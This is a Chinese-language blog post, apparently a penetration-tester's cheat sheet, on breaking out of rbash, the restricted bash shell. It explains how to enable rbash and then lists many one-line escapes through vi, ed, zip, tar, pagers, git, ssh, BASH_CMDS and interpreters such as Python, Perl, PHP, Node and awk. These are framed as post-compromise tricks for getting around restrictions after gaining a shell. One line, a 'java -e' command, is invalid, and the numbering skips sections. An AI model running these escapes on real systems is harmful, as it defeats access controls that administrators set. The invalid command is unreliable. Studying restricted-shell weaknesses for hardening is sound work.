---
title: "rbash逃逸"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# rbash逃逸

### 何为rbash

rbash(The restricted mode of bash),也就是限制型bash；是平时所谓的 restricted shell的一种，也是最常见的 restricted shell（rbash、ksh、rsh等）

rhash可能会设置一些限制：

* 不能使用cd命令（即不能更改目录）
* 不能设置或取消环境变量：SHELL， PATH， ENV， BASH_ENV
* 导入功能受限
* 命令中文件名中不能包含 '/ ' 或'-'
* 不能使用使用 >，>|， <>， >&， &>， >> 等重定向操作符
* 不能使用 unset 命令来取消环境变量或 shell 函数
* 只能执行 PATH 环境变量中指定的命令，而且 PATH 环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等
* ......

rbash提高了安全性，但对我们getshell后的相关操作造成了很多限制（比如反弹shell）

### 启用rbash

首先创建用户：

~~~shell
sudo adduser tw
~~~

创建rbash软连接:

~~~shell
cd /bin
ln -s bash rbash
~~~

然后启用rbash：

~~~shell
sudo usermod -s /bin/rbash tw
~~~

### rbash逃逸

本质是使用某种方法获取一个新的shell，下面提到的方法都有前提条件，比如命令/工具/语言要存在，或某个特殊符号未受限制（如`/`）

#### 1.利用常见应用/文件

使用Linux现有的软件，执行命令获取一个shell

##### vi编辑器

打开vi，在末行模式执行命令：
~~~vi
:set shell=/bin/bash
shell
~~~

即可实现逃逸

##### ed编辑器

~~~shell
ed
!/bin/bash
~~~

##### zip

~~~shell
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
~~~

##### tar

~~~shell
tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
~~~

##### more、less、man

用这三个命令查看任意文件，然后在末行中执行：

~~~sh
!'/bin/bash'
~~~

##### ftp

~~~sh
!'/bin/bash'
~~~

##### git

~~~shell
git help status 
!/bin/bash
~~~

#### 2.利用编程语言

利用编程语言去执行系统命令来启动一个新的shell

##### python

获取一个新的终端或者bash shell：

~~~shell
python -c 'import pty; pty.spawn("/bin/bash");'
~~~

或

~~~shell
python -c 'import os; os.system("/bin/bash");'
~~~

##### perl

~~~perl
perl -e 'system("/bin/bash");'
~~~

除了 Python 和 Perl，还有其他编程语言可以用来尝试逃逸 `rbash`。以下是一些常见的编程语言及其相应的逃逸方法：

##### Ruby
```bash
ruby -e 'exec "/bin/bash"'
```

##### PHP
```bash
php -r 'system("/bin/bash");'
```

##### Lua
```bash
lua -e 'os.execute("/bin/bash")'
```

##### Tcl
```bash
tclsh
exec /bin/bash
```

##### Node.js (JavaScript)
```bash
node -e 'require("child_process").spawn("/bin/bash", {stdio: "inherit"});'
```

##### AWK
```bash
awk 'BEGIN {system("/bin/bash")}'
```

##### Java
```bash
java -e 'Runtime.getRuntime().exec("/bin/bash");'
```

##### expect

~~~expect
expect -c 'spawn /bin/bash; interact'
~~~

#### 3.利用反弹shell

相关符号未被禁用，利用编程语言进行反弹shell即可，不作赘述

#### 5.利用ssh

如果 RBASH 允许使用 ssh 命令，那么用户可以利用它的 -t 选项或 ProxyCommand 选项来执行 /bin/bash 或 /bin/sh：

~~~shell
ssh -t localhost /bin/bash
#可能会让你输密码哈哈哈哈
~~~

另外由于ssh版本的原因，可能会有命令上的区别，这里仅供参考

#### 7.利用bash_cmds自定义shell

~~~shell
BASH_CMDS[a]=/bin/bash;a 
~~~

### 逃逸后的注意事项

有的获得新的rbash后，可能有些命令未引入环境变量，需要我们手动添加：

~~~shell
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin/
~~~

